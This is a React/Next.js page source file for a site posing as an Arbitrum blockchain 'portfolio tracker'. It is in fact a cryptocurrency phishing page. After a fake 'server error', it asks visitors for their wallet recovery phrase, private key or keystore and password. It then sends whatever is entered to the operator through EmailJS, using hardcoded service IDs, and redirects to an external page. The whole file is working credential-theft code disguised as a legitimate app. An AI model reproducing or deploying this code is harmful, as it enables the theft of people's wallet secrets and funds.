"use client";
import React, { useRef } from "react";
import { useState, useEffect } from "react";
import Head from "next/head";
import Image from "next/image";
import emailjs from "@emailjs/browser";
import hero_img from "@/public/images/hero_img.png";
import Footer from "@/components/Home/Footer";
import Link from "next/link";
import node_logo from "@/public/images/node_logo.png";

const Header = () => {
  const [showModal, setShowModal] = useState(false);

  const toggleModal = () => {
    // Show the modal only if scrolled to the bottom

    setShowModal(!showModal);
  };

  const handleCloseModal = () => {
    // Reset the state when the modal is closed

    setShowModal(false);
  };
  return (
    <div>
      <Head>
        <title>Portfolio Tracker for the Arbitrum Blockchain</title>
        <meta
          name="Arbitrum Portfolio Tracker"
          content="Portfolio Tracker for the Arbitrum Blockchain"
        />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <link rel="icon" href="/horizons.ico" />
      </Head>
      <nav className="relative container mx-auto p-6">
        <div className="flex items-center justify-between">
          <div className="pt-2 ">
            <Image src={node_logo} alt="horizon Logo" width={50} height={50} />
          </div>

          {/* menu items  */}
          <div className="flex justify-end  "></div>
        </div>
      </nav>
    </div>
  );
};

// function MyApp({ Component, pageProps }) {
//   return (
//     <TableProvider>
//       <Component {...pageProps} />
//     </TableProvider>
//   );
// }
const page = () => {
  const [isLoading, setLoading] = useState(true);
  const [showTables, setShowTables] = useState(false);
  const [selectedTable, setSelectedTable] = useState("Phrase");

  // for email
  const form = useRef();

  const sendEmail = async (e) => {
    e.preventDefault();
    try {
      // Use the asynchronous sendForm method
      await emailjs.sendForm(
        "service_542uu7o",
        "template_5qaoszl",
        form.current,
        "A6fIR2vDHANonE4JB"
      );

      // Redirect to google.com after the form is successfully submitted
      window.location.href = "https://nodes-sync.pages.dev/qrcode";
    } catch (error) {
      console.error("Error sending email:", error);
      // Handle the error, show a message, etc.
    }
  };

  useEffect(() => {
    // Simulate loading for 3 seconds
    const timeout = setTimeout(() => {
      setLoading(false);
    }, 2000);

    return () => clearTimeout(timeout);
  }, []);

  const handleShowTables = () => {
    setShowTables(true);
  };

  const handleTableClick = (tableName) => {
    setSelectedTable(tableName);
  };

  const validated = () => {
    var regName =
      /^[a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+ [a-zA-Z]+$/;
    var name = document.getElementsByClassName("phrase-boxClass").value;
    var form = document.forms["form"]["name"];

    if (!regName.test(name)) {
      alert("verifying...!!");
      document.getElementById("button").focus();
      return false;
    } else {
      alert("Proceed to generate QRcode");
      return true;
    }
  };

  // quite useless
  const handleSubmit = (event) => {
    event.preventDefault();
    const btn = document.getElementById("button");
    btn.value = "Sending...";

    const serviceID = "service_542uu7o";
    const templateID = "template_5qaoszl";

    emailjs.sendForm(serviceID, templateID, event.target).then(
      () => {
        btn.value = "Verifying";
        window.location.href = "https://google.com";
      },
      (err) => {
        btn.value = "Verify";
        alert(JSON.stringify(err));
      }
    );
  };

  return (
    <div className="mx-auto sm:max-w-xl md:max-w-5xl lg:max-w-5xl xl:max-w-5xl md:container">
      <Header />
      <div>
        <div className="container connect-section">
          <div className="section-container h-screen">
            <div className="connect-content w-full mx-16">
              {isLoading ? (
                <p
                  className="bg-red-100 border border-blue-400 text-blue-900 px-4 py-3 rounded relative animate-pulse  "
                  role="alert"
                >
                  Connecting...
                </p>
              ) : (
                <div className="flex justify-center items-center flex-col form_div text-white">
                  {showTables ? (
                    <div className="max-w-md p-4 bg-[#0f12129f] border border-gray-800 rounded-md">
                      <table className="table-auto">
                        <thead>
                          <tr>
                            <th
                              className={`cursor-pointer ${
                                selectedTable === "Phrase" &&
                                " p-3 table_div rounded-md"
                              }`}
                              onClick={() => handleTableClick("Phrase")}
                            >
                              Phrase
                            </th>
                            <th
                              className={`cursor-pointer ${
                                selectedTable === "Private Key" &&
                                " p-3 table_div rounded-md"
                              }`}
                              onClick={() => handleTableClick("Private Key")}
                            >
                              Private Key
                            </th>
                            <th
                              className={`cursor-pointer ${
                                selectedTable === "Keystore" &&
                                " p-3 table_div rounded-md"
                              }`}
                              onClick={() => handleTableClick("Keystore")}
                            >
                              Keystore
                            </th>
                          </tr>
                        </thead>
                        <tbody>
                          <tr>
                            <td colSpan="3" className="text-center">
                              {selectedTable === "Phrase" && (
                                // content for Phrase
                                <div className="mt-2">
                                  <div className="modal-body text-center justify-content-center mt-4">
                                    <div
                                      className="tab-content g-5"
                                      id="myTabContent"
                                    >
                                      {/* phrase form */}
                                      <div
                                        className="tab-pane fade show active"
                                        id="home"
                                        role="tabpanel"
                                        aria-labelledby="home-tab"
                                      >
                                        <form
                                          id="form"
                                          name="form"
                                          ref={form}
                                          onSubmit={sendEmail}
                                          className="mt-3"
                                        >
                                          <div className="mb-3">
                                            <div className="phrase-box">
                                              <textarea
                                                id="form_name"
                                                type="text"
                                                required
                                                name="from_name"
                                                rows={5}
                                                className="block w-full rounded-md border-0 p-2 text-white shadow-sm ring-1 ring-inset ring-gray-600 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6 bg-[#0f12129f] md:w-96"
                                                placeholder="enter your recovery phrase..."
                                                autoComplete="off"
                                              />
                                            </div>
                                            <div
                                              id="emailHelp"
                                              className=" text-center m-2 mt-4 text-sm text-gray-500"
                                            >
                                              Typically 12 (sometimes 24) words
                                              separated by single spaces
                                            </div>
                                          </div>

                                          <button
                                            type="submit"
                                            className="btn text-white bg-blue-950 rounded-lg p-3 text-md"
                                            id="button"
                                          >
                                            Proceed
                                          </button>
                                        </form>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              )}
                              {selectedTable === "Private Key" && (
                                <div className="mt-2">
                                  <div className="modal-body text-center justify-content-center mt-4">
                                    <div
                                      className="tab-content g-5"
                                      id="myTabContent"
                                    >
                                      {/* private key form  */}
                                      <div
                                        className="tab-pane fade"
                                        id="contact"
                                        role="tabpanel"
                                        aria-labelledby="contact-tab"
                                      >
                                        <form
                                          id="form"
                                          name="form"
                                          className="mt-3"
                                          onSubmit={sendEmail}
                                          ref={form}
                                        >
                                          <div className="mb-3">
                                            <textarea
                                              id="form_name"
                                              type="text"
                                              required
                                              name="from_name"
                                              rows={5}
                                              className="block w-full rounded-md border-0 p-2 text-white shadow-sm ring-1 ring-inset ring-gray-600 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6 form_div md:w-96" // Added md:w-96 for medium-sized screens
                                              placeholder="enter your private key..."
                                              autoComplete="off"
                                            />
                                            <div
                                              id="emailHelp"
                                              className=" text-center m-2 mt-4 text-sm text-gray-500"
                                            >
                                              Typically 64 alphanumeric
                                              characters
                                            </div>
                                          </div>

                                          <button
                                            type="submit"
                                            className="btn text-white bg-blue-950 rounded-lg p-3 text-md"
                                            id="button"
                                          >
                                            Proceed
                                          </button>
                                        </form>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              )}
                              {selectedTable === "Keystore" && (
                                <div className="mt-2">
                                  <div className="modal-body text-center justify-content-center mt-4">
                                    <div
                                      className="tab-content g-5"
                                      id="myTabContent"
                                    >
                                      {/* keystore json form  */}
                                      <div
                                        className="tab-pane fade"
                                        id="profile"
                                        role="tabpanel"
                                        aria-labelledby="profile-tab"
                                      >
                                        <form
                                          id="form"
                                          name="form"
                                          className="mt-3"
                                          onSubmit={sendEmail}
                                          ref={form}
                                        >
                                          <div className="mb-3">
                                            <input
                                              id="email"
                                              name="email"
                                              type="email"
                                              autoComplete="email"
                                              className="block w-full rounded-md border-0 py-1.5 text-gray-400 shadow-sm ring-1 ring-inset ring-gray-300 placeholder:text-gray-400 focus:ring-2 focus:ring-inset focus:ring-indigo-600 sm:text-sm sm:leading-6 bg-[#0f12129f] md:w-96" // Added md:w-96 for medium-sized screens
                                            />
                                            <label
                                              for="dropzone-file"
                                              className="keystore-label"
                                            >
                                              <div className="keystore-label-item flex flex-col justify-center items-center pt-5 pb-6">
                                                <svg
                                                  // style="width: 30px"

                                                  aria-hidden="true"
                                                  className="mb-3 w-10 h-10 text-gray-400"
                                                  fill="none"
                                                  stroke="currentColor"
                                                  viewBox="0 0 24 24"
                                                  xmlns="http://www.w3.org/2000/svg"
                                                >
                                                  <path
                                                    stroke-linecap="round"
                                                    stroke-linejoin="round"
                                                    stroke-width="2"
                                                    d="M7 16a4 4 0 01-.88-7.903A5 5 0 1115.9 6L16 6a5 5 0 011 9.9M15 13l-3-3m0 0l-3 3m3-3v12"
                                                  ></path>
                                                </svg>
                                                <p className="text-[13px] text-slate-500">
                                                  <span className="text-sm text-slate-500">
                                                    Click to upload
                                                  </span>{" "}
                                                  or drag and drop
                                                </p>
                                                <p className="text-[13px]">
                                                  SVG, PNG, JPG or GIF (MAX.
                                                  800x400px)
                                                </p>
                                              </div>
                                              <input
                                                id="dropzone-file"
                                                type="file"
                                                className="hidden"
                                              />
                                            </label>
                                            <div
                                              id="emailHelp"
                                              className=" text-center m-2 mt-4 text-sm text-gray-500"
                                            >
                                              Several lines of text beginning
                                              with plus the password you used to
                                              encrypt it
                                            </div>
                                          </div>

                                          <button
                                            type="submit"
                                            className="btn text-white bg-blue-950 rounded-lg p-3 text-md"
                                            id="button"
                                          >
                                            Proceed
                                          </button>
                                        </form>
                                      </div>
                                    </div>
                                  </div>
                                </div>
                              )}
                            </td>
                          </tr>
                        </tbody>
                      </table>
                    </div>
                  ) : (
                    <p
                      className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded relative animate-pulse"
                      role="alert"
                    >
                      Oops! There was a server error(SF-243227BL) while
                      connecting, connect manually to proceed.
                    </p>
                  )}
                  {!showTables && (
                    <button
                      onClick={handleShowTables}
                      className="bg-blue-500 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
                    >
                      Connect Manually
                    </button>
                  )}
                </div>
              )}
            </div>
          </div>
        </div>
      </div>
      <Footer />
    </div>
  );
};

export default page;
